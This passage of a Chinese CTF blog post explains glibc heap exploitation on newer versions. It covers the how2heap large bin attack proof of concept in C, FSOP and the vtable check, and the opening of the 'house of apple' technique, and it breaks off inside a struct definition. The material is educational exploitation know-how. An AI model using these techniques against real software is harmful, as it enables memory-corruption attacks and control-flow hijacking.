<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ha0-y.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":18,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="大古：一开始就用红色形态作战不就行了吗">
<meta property="og:type" content="article">
<meta property="og:title" content="猫猫&amp;&amp;苹果香蕉の屋">
<meta property="og:url" content="https://ha0-y.github.io/2023/11/02/%E7%8C%AB%E7%8C%AB%20&&%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/index.html">
<meta property="og:site_name" content="ham5ter">
<meta property="og:description" content="大古：一开始就用红色形态作战不就行了吗">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-11-02T12:18:18.558Z">
<meta property="article:modified_time" content="2024-04-16T08:25:44.136Z">
<meta property="article:author" content="ham5ter">
<meta property="article:tag" content="IO_FILE">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://ha0-y.github.io/2023/11/02/%E7%8C%AB%E7%8C%AB%20&&%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>猫猫&&苹果香蕉の屋 | ham5ter</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ham5ter</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">I'm possible</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ha0-y.github.io/2023/11/02/%E7%8C%AB%E7%8C%AB%20&&%20%E8%8B%B9%E6%9E%9C%E9%A6%99%E8%95%89%20%E3%81%AE%20%E5%B1%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ham5ter">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ham5ter">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          猫猫&&苹果香蕉の屋
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-11-02 20:18:18" itemprop="dateCreated datePublished" datetime="2023-11-02T20:18:18+08:00">2023-11-02</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categorievariants/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>28k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>50 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>大古：一开始就用红色形态作战不就行了吗</p>
</blockquote>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>glibc</code> 高版本逐渐移除了<code>__malloc_hook/__free_hook/__realloc_hook</code> 等等一众 <code>hook</code> 全局变量。</p>
<p>利用手段向 IO_FILE 靠拢，但是随着版本越来越高，堆利用手段也变少，IO_FILE 的问题也逐渐减少。</p>
<h3 id="large-bin-attck"><a href="#large-bin-attck" class="headerlink" title="large bin attck"></a>large bin attck</h3><p>一个范围的bin，保证了其内部有序性。在 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5177">浅析largebin attack</a>文章中有张图方便理解<br>同样大小的bin按照free的时间顺序进行排序</p>
<ul>
<li>fd, bk: 相同大小堆的双向链表，按照时间先后排序</li>
<li>fd_nextsize, bk_nextsize: 大小不同的双向链表</li>
<li>如果只有一个，fd, bk指向 main_arena fd_nextsize 和 bk_nextsize 指向自己</li>
</ul>
<p>直接使用 how2heap 2.36 的 large bin attack 进行演示(Glibc &gt;&#x3D; 2.30 都可以使用)。</p>
<ul>
<li>漏洞的点在开头的注释中给出，就是最后一句赋值语句导致的，victim(正在链入largebin)的size小于已经存在的bin</li>
<li>malloc两个大chunk p1,p2，两个 0x18 是防止 <strong>相邻的unsorted bin 合并</strong> 以及 <strong>被top_chunk合并</strong>。</li>
<li>这里注意的是：p1 的 size 大于 p2，但是不要差太多，在同一个largebin 里</li>
<li>free p1，将 p1 放入large bin 中</li>
<li>free p2，修改 p1 的 bk_nextsize 为 &amp;target-0x20</li>
<li>将 p2 放入largebin中</li>
<li>target 值就变成了 p2 的地址</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment">	// 因为只有两个bin，因此可以解读一下。</span></span><br><span class="line"><span class="comment">	// 看源码，bck是  bck = bin_at (av, victim_index);</span></span><br><span class="line"><span class="comment">	// av 就是 arena地址，bck就是找arena</span></span><br><span class="line"><span class="comment">	// fwd = bck-&gt;fd;   与large bin 之间的双向链表，在这里就是存在的 p1</span></span><br><span class="line"><span class="comment">	if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) &#123;</span></span><br><span class="line"><span class="comment">		fwd = bck;                                    // fwd = arena</span></span><br><span class="line"><span class="comment">		bck = bck-&gt;bk;                                // bck = p1</span></span><br><span class="line"><span class="comment">		victim-&gt;fd_nextsize = fwd-&gt;fd;                // vitim 要放入large bin 的堆 p2 </span></span><br><span class="line"><span class="comment">		victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;   // victim.bk_nextsize = p1-&gt;bk_nextsize = &amp;target-0x20 </span></span><br><span class="line"><span class="comment">		fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;  // p1.bk_nextsize = victim</span></span><br><span class="line"><span class="comment">		// 但是victim.bk_nextsize = &amp;target-0x20。而这个地址的 fd_nextsize = victim 也就是将 target 值改为 victim，</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd_nextsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">assert</span>((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>达到一个任意地址写成堆地址的目的。<br>Glibc 2.29 之前，unsortedbin attack 和 largebin attack 都是攻击 bk 指针，但是后来加了一句检查</p>
<p>在攻击时，fd,bk,fd_nextsize 可以随便覆盖内容，在经过malloc后会修复fd，因为fd指向 size 较小的 victim</p>
<h3 id="IO-流"><a href="#IO-流" class="headerlink" title="IO 流"></a>IO 流</h3><p>这里一般指 存在一条链，某个函数 使用 vtable 的函数指针来调用函数。</p>
<p>程序使用exit退出程序</p>
<ul>
<li>从main函数退出，glibc会调用exit</li>
<li>显示调用 exit 函数退出程序</li>
</ul>
<p>malloc_assert: house of kiwi 提出，触发下面的条件选一个</p>
<ul>
<li>topchunk的大小小于MINSIZE(0X20)  </li>
<li>prev inuse位为0  </li>
<li>old_top页未对齐</li>
<li>但是从libc 2.36 发生了一点变化，移除IO操作，也就是从libc 2.36不能使用</li>
<li>libc 2.37 直接没有这个函数了。</li>
</ul>
<p>libc 2.35：</p>
<ul>
<li>两个函数(fflsh, fxpeintf)都涉及IO操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行_IO_flush_all_lockp函数，这个函数会根据_IO_list_all刷新链表中的所有文件流.</p>
<p>当程序从 main 函数返回或者执行 exit 函数的时候，均会调用 fcloseall 函数，调用链如下</p>
<ul>
<li>最后会遍历<code>_IO_list_all</code> 存放的每一个 <code>IO_FILE</code> 结构体</li>
<li>如果满足条件的话，会调用每个结构体中 <code>vtable-&gt;_overflow</code> 函数指针指向的函数。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	fcloseall</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all_lockp</span><br><span class="line">				_IO_OVERFLOW</span><br></pre></td></tr></table></figure>


<p>vtable 函数调用过程，就是调用跳表，比如说调用 <code>__overflow</code> </p>
<ul>
<li><code>IO_validate_vtable</code>函数负责检查<code>vtable</code>的合法性，会判断<code>vtable</code>的地址是不是在一个合法的区间。如果<code>vtable</code>的地址不合法，程序将会异常终止。</li>
<li>最后就是调用 vtable 里面的函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))a</span></span><br></pre></td></tr></table></figure>

<p>检查函数</p>
<ul>
<li>检查此结构体的 vtable 与 <code>__io_vtables</code> 全局变量表偏移</li>
<li>在这个表里的表就能通过检查。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在劫持vtable都差不多在这个表里找一个能符合条件的表进行利用。</p>
<p>比如挟持到 <code>_wide_data</code> 相关的表，因为这个表含有vtable，并且函数调用没有检查。</p>
<ul>
<li>而与其相关的表有3个 找 <code>_IO_wfile_jumps</code> 开头的表存在三个</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h2><blockquote>
<p>有三个版本，这里是 version 2.0，控制函数执行流。</p>
</blockquote>
<ol>
<li>IO 流：exit 或者 malloc_assert</li>
<li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址 </li>
<li>能使用一次 <code>largebin attack</code>（一次即可）</li>
</ol>
<p>wide_data 结构体</p>
<ul>
<li>其中也存在一个 vtable</li>
<li>由上面的FSOP知道，在调用<code>_wide_vtable</code>虚表里面的函数时，同样是使用宏去调用，但是没有检查，因此更好利用</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> 